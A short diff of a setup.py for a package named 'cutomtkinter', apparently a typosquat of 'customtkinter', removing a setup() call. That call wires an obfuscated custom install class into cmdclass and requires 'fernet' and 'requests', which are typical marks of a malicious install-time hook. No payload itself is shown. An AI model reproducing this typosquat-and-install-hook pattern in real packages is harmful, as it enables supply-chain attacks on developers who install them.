@@ -18,22 +18,5 @@ class XTqboYzRjvpORQdaoYHOZuoFOrEiHnQPiQcFPvSoVMWRBHEHKPRxeqxNzHuHTiJyvMpCOZgUDG
             install.run(self)
 
 
-setup(
-    name="cutomtkinter",
-    version=VERSION,
-    author="QzvBgkUA",
-    author_email="fISPQFGRUdw@gmail.com",
-    description=DESCRIPTION,
-    long_description_content_type="text/markdown",
-    long_description=LONG_DESCRIPTION,
-    cmdclass={
-        'install': XTqboYzRjvpORQdaoYHOZuoFOrEiHnQPiQcFPvSoVMWRBHEHKPRxeqxNzHuHTiJyvMpCOZgUDGDFwFxKmrhZeQAK,
-    },
-    packages=find_packages(),
-    setup_requires=['fernet', 'requests'],
-    keywords=[],
-    classifiers=[
-        "Operating System :: Microsoft :: Windows",
-    ]
-)
+# setup(...) removed                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                   
 
